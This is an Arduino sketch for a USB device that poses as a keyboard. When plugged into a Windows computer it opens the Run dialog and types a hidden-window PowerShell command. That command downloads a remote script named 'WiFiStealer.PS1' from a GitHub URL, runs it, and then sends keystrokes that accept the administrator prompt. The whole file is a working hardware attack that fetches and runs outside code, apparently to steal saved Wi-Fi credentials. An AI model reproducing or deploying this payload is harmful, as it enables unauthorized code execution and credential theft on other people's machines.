#include <Keyboard.h>

void setup() {
  // Initialize the USB keyboard emulation
  Keyboard.begin();
  delay(200);  // Delay to allow time for the keyboard to initialize

  // Simulate pressing the Windows key and 'r' key simultaneously
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(200);  // Delay 0.2 seconds

  // Type the PowerShell command, specify remote powershell script location 
  Keyboard.println("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/WiFiStealer.PS1\" -o \\d.ps1;\\d.ps1");

  delay(500);  // Delay 0.5 seconds

  // Simulate Ctrl + Shift + Enter
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(500);  // Delay 0.5 seconds

  // Simulate Alt + Y
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
}

void loop() {
  // Empty loop
}
